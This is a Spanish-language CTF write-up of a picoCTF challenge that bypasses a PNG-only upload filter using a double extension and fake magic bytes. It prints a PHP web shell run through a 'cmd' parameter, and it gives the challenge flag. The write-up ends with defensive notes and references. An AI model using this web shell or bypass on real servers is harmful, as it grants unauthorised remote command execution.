## Descripción
I found a web app that can help process images: PNG images only!
## Solución
- Accedemos al sitio web del reto proporcionado por la instancia.
- Nos encontramos con una página que contiene un formulario para cargar archivos, indicando que solo acepta imágenes PNG.
- Revisamos el archivo `robots.txt` (`/robots.txt`) en el navegador para identificar posibles rutas o directorios del aplicativo:
```text
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
- Accedemos al archivo `/instructions.txt` para consultar las notas dejadas por el desarrollador:
```text
Let's create a web app for purchasing images.
It's not finished yet, but it should only accept PNG images for now.
1. Verify that the file has a .png extension.
2. Check that the magic bytes match a PNG file.
3. Upload to the uploads/ directory.
```
- Al analizar estas instrucciones, identificamos los controles de validación implementados en el servidor:
  - El nombre del archivo debe contener la extensión o subcadena `.png`.
  - Los primeros bytes del archivo (*magic bytes*) deben coincidir con la cabecera de un archivo PNG (`PNG` o `\x89PNG\r\n\x1a\n`).
  - Los archivos válidos se guardan en el directorio público `/uploads/`.
- La vulnerabilidad radica en que el backend no valida que `.png` sea la extensión final del archivo ni restringe la ejecución de scripts en `/uploads/`, lo que permite una evasión mediante doble extensión (`.png.php`).
- Creamos un archivo llamado `payload.png.php` que incluya en su primera línea la cabecera de PNG para pasar la comprobación de *magic bytes*, seguido del código PHP para explorar el servidor o localizar la bandera:
```php
PNG
<?php
echo system($_GET['cmd']);
?>
```
- Subimos el archivo a través del formulario web. La aplicación acepta el archivo al validar la cabecera y la subcadena `.png`, confirmando que se subió con éxito.
- Navegamos a la ruta del archivo subido en `/uploads/payload.png.php` pasando comandos a través del parámetro `cmd`.
- Listamos los archivos del directorio o buscamos el archivo de la bandera (`find / -name "*.txt"` o revisando `/var/www/html/`), donde encontramos el archivo que contiene la bandera.
- Leemos el archivo y obtenemos la bandera:
```text
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```
## Notas Adicionales
- Unrestricted File Upload: Vulnerabilidad que ocurre cuando una aplicación web permite a los usuarios subir archivos al servidor sin validar adecuadamente su tipo, extensión, contenido o permisos de ejecución.
- Magic Bytes: Secuencia de bytes al inicio de un archivo utilizada por los sistemas operativos y aplicaciones para identificar el formato real del archivo independientemente de su extensión.
- Evasión por doble extensión: Ocurre cuando un filtro comprueba de forma laxa si un archivo contiene cierta extensión (como `.png`) sin verificar que esté al final del nombre, permitiendo que extensiones ejecutables como `.php` sean interpretadas por el servidor web.
- Ejecución en directorios de subida: Las carpetas de destino como `/uploads/` nunca deben tener permisos de ejecución de scripts en el servidor web (por ejemplo, deshabilitando el motor de PHP para ese directorio específico).
## Referencias
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PortSwigger - File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)